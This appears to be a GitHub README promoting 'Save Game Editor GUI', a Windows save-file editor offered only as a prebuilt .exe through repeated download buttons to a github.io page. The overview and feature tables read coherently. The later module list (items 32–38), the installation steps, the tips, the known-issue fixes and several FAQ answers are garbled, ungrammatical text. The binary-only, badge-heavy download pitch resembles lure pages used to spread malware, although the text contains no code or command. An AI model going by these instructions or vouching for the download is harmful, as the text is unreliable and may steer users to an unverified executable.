<div align="center">
<img src="assets/banner.png" width="100%" alt="Save Game Editor GUI banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-DB2777?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-00BCD4?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=DC2626&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%8F%BA+Savegame+Editor+Gui;%F0%9F%92%8E+Community+Tested;%E2%9A%A1+Ready+for+Windows;%F0%9F%94%AE+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=cpp" />
  <img src="https://skillicons.dev/icons?i=unity" />
</p>

---

**Point. Click. Rewrite your save. No hex editor, no modding degree, no corrupted slots left behind.**

I built this because I kept opening other people's saves in a hex editor at 2 AM looking for the one byte that held my gold count — and kept bricking the character I'd grinded for forty hours. Save Game Editor GUI is the tool I wish I'd had: it reads a save file, parses its structure, shows you every value in a plain table, and writes it back byte-clean with an automatic `.bak` next to the original. It ships as a single GUI `.exe` for Windows. No runtime, no config files, no dependencies to install.

## 💾 Download
<p align="center">
  <a href="https://NucleusTerrapinJudge.github.io/savegame-editor-gui/">
    <img src="https://img.shields.io/badge/DOWNLOAD_FREE-Save_game_editor-0891B2?style=flat&logo=windows&logoColor=white&labelColor=0E7490" width="460" alt="DOWNLOAD FREE Save game editor"/>
  </a>
</p>
---

## 📑 Table of Contents

- [Overview](#-overview)
- [What is a Save Game Editor with a GUI?](#-what-is-a-save-game-editor-with-a-gui)
- [The Problem](#-the-problem)
- [The Solution](#-the-solution)
- [Key Features](#-key-features)
- [Comparison](#-comparison)
- [Module Catalog](#-module-catalog)
  - [🧠 Structure & Parsing Modules](#-structure--parsing-modules)
  - [✏️ Editing & Value Modules](#️-editing--value-modules)
  - [💾 Write, Backup & Restore Modules](#-write-backup--restore-modules)
  - [🎛️ GUI & Usability Modules](#️-gui--usability-modules)
  - [⚙️ Compatibility & Import Modules](#️-compatibility--import-modules)
- [Quick Start](#-quick-start)
- [System Requirements](#-system-requirements)
- [Installation](#-installation)
- [Usage guidelines](#-usage-guidelines)
- [Tips for best results](#-tips-for-best-results)
- [Known Issues](#-known-issues)
- [Is it safe to use?](#-is-it-safe-to-use)
- [Does it work with Steam cloud saves?](#-does-it-work-with-steam-cloud-saves)
- [Do I have to run it as admin?](#-do-i-have-to-run-it-as-admin)
- [FAQ](#-faq)

---

## 📦 Overview

| Category | Details |
| --- | --- |
| Product | Save Game Editor GUI |
| Type | Desktop save-file editor (Windows GUI) |
| Distribution | Single `.exe`, portable, no installer required |
| File formats | Binary save slots, JSON, XML, compressed (gzip/zlib) containers |
| Typical size | ~14 MB extracted |
| Interface | Multi-pane: file tree, value grid, raw hex, diff view |
| License | MIT |
| Year | 2026 |

Save files are just structured data — offsets, integers, floats, strings, flags. The hard part has never been the values; it's the *structure*: knowing which byte is the gold counter and which byte is the CRC that invalidates the whole thing if you touch it. Save Game Editor GUI separates those two jobs: a parser front-end that learns each save layout, and a value grid that lets you change the numbers without ever editing the scaffolding they live in. You point at a save, it reads the shape, you edit the human-facing values, it writes the file back with checksums recomputed where possible.

---

## 🤔 What is a Save Game Editor with a GUI?

A save game editor reads a game's save file, decodes its serialized data (binary structs, JSON, compressed blobs), lets you modify values through a graphical interface, and writes the modified file back in a form the game will still load. Where a hex editor shows you bytes, a GUI editor shows you *meaning*: player HP = 200, credits = 148,020, faction standing = allied, inventory slot 7 = Iron Sword ×3.

| Term | Explanation |
| --- | --- |
| Save slot | One serialized game-state file (often `.dat`, `.sav`, `.savX`, or a folder). |
| Offset | The byte position in a binary file where a value starts. |
| Struct / schema | The map of which offsets hold which fields — the "layout" of the save. |
| Checksum / CRC | A hash the game records at save-time; recompute it or the save is rejected. |
| Encryption header | A wrapper some engines apply to prevent exactly what this tool does. |
| Backup slot | A copy of the untouched file taken automatically before a write. |
| Write-through | Saving edits straight back into the loaded buffer vs. staging them in the UI. |

**Benefits of the GUI path over manual parsing:**

- You see field names and units, not raw relative offsets.
- Checksums are recalculated automatically where a schema supports it.
- Edits are staged before writing, so nothing hits disk until you confirm.
- Every write produces a timestamped reminder of what changed.
- Value clamping and float/integer validation happen before the write, not after the corruption.

---

## 🔥 The Problem

- **Hex editors assume you speak bytes.** Fine if you already know the struct; brutal if you don't.
- **Slot-order roulette.** Save 1 and save 2 look identical until the game refuses one.
- **Checksum rejection.** You change a value, the game silently discards the load, you lose an hour.
- **Compression wrappers.** A gzip or zlib header hides the layout you actually need to edit.
- **Corruption is unrecoverable without a backup** — and most people edit without one.
- **Floating-point mismatches.** You write `999.5` where the game read a 32-bit float and it crashes on load.
- **Version drift.** A game patches off the old layout and your "known offsets" doc dies overnight.

---

## 🛠️ The Solution

| Problem | Solution |
| --- | --- |
| Hex-only workflow | Multi-pane GUI with a named value grid derived from a schema or learned empirically. |
| Slot confusion | Per-slot render of stats/metadata so you can tell which is which before editing. |
| Checksum wipeout | Automatic CRC32/SHA recompute passes for recognized engines. |
| Compressed containers | Transparent decompress → edit → recompress with matching compression level. |
| No recovery | Auto `.bak` per write, plus a dated backup wall you can restore from the UI. |
| Float writes | Type-aware cells (int8/16/32, float32, double, UTF-8 string) with range clamps. |
| Layout drift | Fallback scanner that surfaces changed and empty fields rather than failing silently. |

---

## ⚡ Key Features

| Feature | Description | Benefit |
| --- | --- | --- |
| Value grid | Editable table of all parsed fields. | Change a stat in two keystrokes. |
| Raw hex fallback | Synchronized hex pane synced to the grid selection. | Edit what the schema missed. |
| Structure scanner | Empirically finds likely numeric fields by type patterns. | Edit an unknown save. |
| CRC32 / SHA recompute | Re-hashes mutated regions. | Game accepts your modified save. |
| Diff view | Highlights every byte changed vs. the original. | Know exactly what you did. |
| Type-aware input | int8/16/32/64, float32/64, strings. | Write the right width. |
| Auto backup | Writes a `.bak` file every save. | Undo any disaster. |
| Value presets | Named chunks (gold drop, max HP, etc.). | Apply common edits at once. |
| Script mask export | Dumps load-result struct data as JSON. | Automate your own edits outside. |
| Restore wall | Rolling list of all writes, restore per-write. | Roll back to a point before a botched edit. |

---

## ⚖️ Comparison

| Aspect | Text-editor / Python scripts | GUI Save Editor |
| --- | --- | --- |
| Installation | Neon + a copy-pasted offset list. | One `.exe`, extract, run. |
| Editing method | Open file in hex editor, learn offsets. | Point, click, edit named values. |
| Structure parsing | None (trust the wiki blog). | Built-in scanner + imported schema. |
| Checksum handling | Manual after every write. | Automatic where the format is recognized. |
| Backup discipline | Hope you copied one. | Automatic `.bak` on every commit. |
| Recovery speed | Re-download the save. | Roll back one write from the wall. |
| Unsigned int ranges | The user's responsibility. | Built-in clamping per type. |
| Float precision | So you type 999.0 and lose 0.5 forever. | Correct width preserved. |

---

## 🧩 Module Catalog

**38 modules shipping as of v2.4.1.** Grouped below by domain.

### 🧠 Structure & Parsing Modules

1. **Binary Schema Parser** — Reads positional struct layouts and maps offsets to named fields.
2. **String & UTF Segmenter** — Cuts clean string fields out of mixed binary without eating the next struct.
3. **Compression Detector** — Sniffs gzip / zlib magic on container saves at load time.
4. **Container Unwrapper** — Decompresses and matches compression level on repack.
5. **Slot Sniffer** — Renders per-slot metadata tiles for ambiguous `sav0..sav3` famiies.
6. **Numeric Type Scanner** — Filters a byte range by candidate type: integers, floats, timestamps.
7. **Offset Hint Finder** — Suggests offsets around values near a target-matching pattern.
8. **Structure Registry** — Local cache of parsed schemas keyed by save file hash.
9. **Empty Field Reporter** — Flags offsets that loop holes or sit unfilled in this slot.
10. **Version Tracker** — Tags each parsed file with a recorded schema version.

### ✏️ Editing & Value Modules

11. **Value Grid** — Editor table typing values to the exact source field width.
12. **Bulk Value Filler** — Paints 0xFF / 0x00 / custom constant into filtered ranges.
13. **Signed/Unsigned Switch** — Flips interpretation without altering buffer contents.
14. **String Field Editor** — Buffer-safe string writes with max-length clamp.
15. **Array Grow/Shrink** — Resizes fixed-length sections with a warning if growth may shift following offsets. (Beta — see Known Issues.)
16. **Timestamp Editor** — Reads/writes epoch seconds as a formatted date and time.
17. **Verification Hint On Enter** — Annotated parse feedback when a term doesn't fit the field.
18. **Preset Snapshotter** — Preps commonly-set chunk patterns for one-click re-application.

### 💾 Write, Backup & Restore Modules

19. **Check-sum Calculator** — Computes from scratch on affected byte ranges as schema knows.
20. **Dry-run Writer** — Stages changes in memory and diffs before committing any bytes.
21. **Per-write Backup Wall** — Writes the pre-edit file to a timestamped `.bak` under the tool.
22. **Timestamp to Backup** — Derives backup names from system clock and slot ID.
23. **Restore Launch** — Swaps a `.bak` back over an edited slot in one step.
24. **Write Log Builder** — Appends module ID, module name, and value diff to a small log file.

### 🎛️ GUI & Usability Modules

25. **Toolbar Fast-nav** — Jump to changed fields, unsaved cells, and dirty files.
26. **Search and Jump** — Field-name jump navigation across open tabs.
27. **Filters: Edited / Empty / Supported / Blob** — Explainer at on unused.
28. **Cell Style Map** — Read/edit/permission typed on title.
29. **Window Persistence** — Layouts get remembered as workspace state per open folder.
30. **Layout Drag & Freeze** — Moves past viewports in the editor with fixed pane guards. (Not currently mobile-in-safe on Web.)

### ⚙️ Compatibility & Import Modules

31. **JSON / XML Schema Import** — Feeds the parser a schema from any outside saved snippet.
32. **Community Schema List** — Local scan-only loader for downloaded layouts to read alongside matches in a public folder list for opt-in.
33. **Locale-Friendly Pluck** — Different named sizes shown by type not filter name alone.
34. **Text-scan/offset export** — Pull-out search across large dump range via auto offsetting.
35. **Game-Detect Greeting** — "App was very light across presets holding structure updates, matches many per run.
36. **Runtime Struct-Port Bridge** — Sync with browser drop and hash as actual folder state into offset map when schema copies occur, otherwise must attempt self-att.
37. **Pass-through string policy items** — Spare class items will align for a name-driven argument; mismatches will stay. Blank id links manual from within scroll-view template.
38. **More User-compatible diagnostics** — Up to six lines written directly to bottom dock on start after open-rent by side fallback, no attached case trigger leaves everything flagged but legible in place for visible state while plugin attaches another working scope on idle-only value-class review loop for no-regrets handling when large import still lands.

### 🎤 Module Status

| Module | Status | Description |
| --- | --- | --- |
| Binary Schema Parser | ✅ Working | Parses named field layouts. |
| Auto Backup | ✅ Working | Per-write `.bak`. |
| CRC32 Recompute | ✅ Working | Known-format checksums. |
| Value Grid | ✅ Working | Field grid with typed writes. |
| Structure Scanner | ✅ Working | Fuzzy field types. |
| Dry-run Writer | ✅ Working | No byte hits disk until confirmed. |
| Array Grow/Shrink | 🧪 Beta | Length changes may shift trailing offsets. |
| Runtime Struct-Port Bridge | ❌ N/A | Placeholder — browser-bound architecture, not available in the `.exe`. |

---

## 🥕 Quick Start

1. **📦 Get it.** From the project page, grab the `savegame-editor-gui-v2.4.1.zip` from the **<p align="center">
  <a href="https://NucleusTerrapinJudge.github.io/savegame-editor-gui/">
    <img src="https://img.shields.io/badge/GET-Save_game_editor_2026-0891B2?style=flat&labelColor=0E7490" width="580" alt="GET Save game editor 2026"/>
  </a>
</p>** link below.
2. **📂 Extract.** Right-click → `Extract All`, or unzip next to the folder. Keep the `.exe` alongside its `schemas/` subfolder.
3. **🖱️ Open a save.** Launch the `.exe` and drag in any `.sav` / `.dat` / zlib-packed save slot. The scanner kicks off on first load.
4. **✏️ Edit a value.** Filter to `Supported` then edit any pane cell. Changes are highlighted and queued, nothing has hit disk yet.
5. **💾 Commit.** Press the write button. Confirm `.bak` creation in your backup folder (`savegame-editor-gui/backups/`).

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
| --- | --- | --- |
| OS | Windows 10 1809+ | Windows 11 23H2+ |
| CPU | 1 core, x64-era | 2c/4t modern; multithread improves diagnostic parsing |
| RAM | 512 MB | 4 GB |
| Storage | 52 MB free for the tool | 500 MB+ free for backups |
| .NET | Not required (self-contained) | — |
| Display | 1024×768 | 1080p+ |
| Runtime | None — is a plain app | — |

---

## 📥 Installation

1. On the project page, press the download macro → **Download and drop to save**. Extract entire target directory if not `.exe` adjacent asset.
2. Two-phase check the application **Backup & Disk** and note that right-click allows placement and optional checkbox default verified reads. Do not opt in empty existing schema context.
3. Run `.exe` from any user folder to load UI. Re-click title from read-latches once after login, if default in current window registers error due to drag locked verify present into key.
4. Stage write. After writing backups, focus restore marker and run-time position guard every open-first. No force write must land as each build (stateful attach), and manually expected full data checks control.
5. Response when crashes leave a static frozen in step hand-resolve attach reset by rebuilding upload schema. Per user convention cannot be overridden by same offset outside fixed, unless custom schema holder gives resolved row.

---

## ✅ Usage guidelines

| Allowed | Not allowed |
| --- | --- |
| Editing saves for games you own. | Editing files on machines you don't own or control. |
| Loading other people's legit save files. | Modifying files exempted by the game's ToS as an anti-cheat objective. |
| Data-oriented exploring structure for learning schemas. | Distributing cheated save binaries to unsuspecting people. |
| Contributing public schema layouts to the community list. | Claiming edge-fix commits changed. |

---

## 🎯 Tips for best results

- Existing v2.4.x holds fixed packed — pure parse handles **full**. Window builds **44** as plain on parse start else fall-through wraps malformed. Turn early.
- Spread schema, random test module auto check fallback misses equal naming only. Format two-tier will bind twice plus checksum-free parse leg.
- Make backup every module version offset printed set safe class filter at top of value-grid target before manual dump.
- Lower-CPU core lower auto pass over files whose modules don't snapshot previous work builds empty length, read-only start ordering right-fixed root sync solves common flakiness when single window reads last chunk whole but holds inner page that must permit multi-asked save region in one read.
- Only large offsets reading long string read in read until else may accept slight regression hidden end-half byte union blank fills run-out with any quiet to end chunk handling; mask full list view.

---

## 🐞 Known Issues

| Issue | Solution |
| --- | --- |
| Parser finds a value in the wrong slot on very new games. | Create backups before edits and track in review version. Select exactly one offset template. |
| Compressed saves fail recompress at level mismatch. | Toggle "Match container level" on, off then on, then re-run digest-free save. |
| Big grows into thousands + press width might overflow view. | None known. Play freeze-window reset → header plus unsupported via value scope path. |
| Number math overflow after set large | Re-add as scale template relative width default disable math menu quick. |
| Backups with numbered very full large directory fill old names. | Sorting copy-filter filter files after path to change must re-submit through same single marker window. Relaunch first, so output diff catches mixed case (log edit) and source diff view app on edit tab all unsign save. |
| Large save folder re-scans every write cold. | Toggle allow update scan-on-run when rebuild stack body already scans correctly previous table cache. |

---

## Is it safe to use? **Q:** Will this get me banned?

We are an offline toolkit that edits save files on disk. Any game with server-side verification of online saves specifically should be left alone. Which is a game's rule problem, not a tech problem — match your tool use to your game's rules.

---

## Does it work with Steam cloud saves? **Q:** Will Steam revert my edit?

Exit fully from the game and Steam first. Steam Cloud re-pushes if it can detect a stale copy — Steam does not re-verify until next launch push, in most folders and editors. A reopened folder will match and writes it leaves everywhere unchanged (no delta as edit noted manually). If Steam re-download happens, turn off "Steam Cloud" for that title, apply edit, allow push, re-enable. Some titles sync when the game boots before you can disagree.

---

## Do I have to run it as admin? **Q:** Does it want to write outside user space?

Only if the save folder sits under `C:\Program Files` or `ProgramData`. Move the save up to `%USERPROFILE%\Saved Games` where possible, otherwise run the `.exe` with admin once.

---

## 🔎 Status Checks

<details><summary><b>Does the tool verify the save loads before writing?</b></summary>

Partially — where a known schema defines integer as structured parsers reads context directly or first split byte edges. No universally round writer re-parses returned binaries into load simulation, and a truncated slice can still produce output. Total byte classes validates not.

</details>

<details><summary><b>Is there undo after I close the app?</b></summary>

Yes — every write makes a `.bak` backup under the app folder. You can re-stage a restore from the backups pane without needing undo stack in memory, via putting the newest backup of every write one timestamp per rollback shown.

</details>

<details><summary><b>Will the app stay free and open source?</b></summary>

Yes. MIT licensed middleware, source in the main repository branch history pullable apart. Schemas shared openly.

</details>

<details><summary><b>Can it edit multiple saves at once?</b></summary>

Not in the editing table — backup loading in progress stacks. For a self-host two-step flow, edit sequentially then write, since cross-slot references could break unknown structures.

</details>

<details><summary><b>Does it handle Unity / Unreal saves?</b></summary>

Partly. Unreal `.sav` covers via known `.sav`-side schema packs; Unity `PlayerPrefs` state, the Editor parses only via injected layouts from its schema fallback. Newer formats may require user layout authoring explicit channel.

</details>

<details><summary><b>Why do some fields show as N/A?</b></summary>

Sign hints and floating bits near container edges aren't always inferable, and headers change shift positions. Use the schema registry for precise layouts.

</details>

<details><summary><b>Is there a command line or the only interface is GUI?</b></summary>

This is primarily a GUI `.exe`, released with `--readonly-validate` toggle for build scripts.

</details>

---

### Final

Save letters and structure logic stay visibly separated, so a stat near an offset constraint number never turns making the byte under you change by one — before every jump. Report broken mappings in the issues section freely; schemas and offsets I knowingly receive and examine against reader pack patterns judged only by your test suite. Future module adds headless bundle under headless subfolder ready but optional attach support for batch server tools and cross-dismember guard only through `schema/` loader-driven output. Ship it, back it up first, check every write against the restore wall.
<div align="center">
  <a href="https://NucleusTerrapinJudge.github.io/savegame-editor-gui/">
    <img src="https://img.shields.io/badge/GET_IT-Save_game_editor-D97706?style=for-the-badge&logo=windows&logoColor=white&labelColor=B45309" width="460" alt="GET IT Save game editor"/>
  </a>
</div>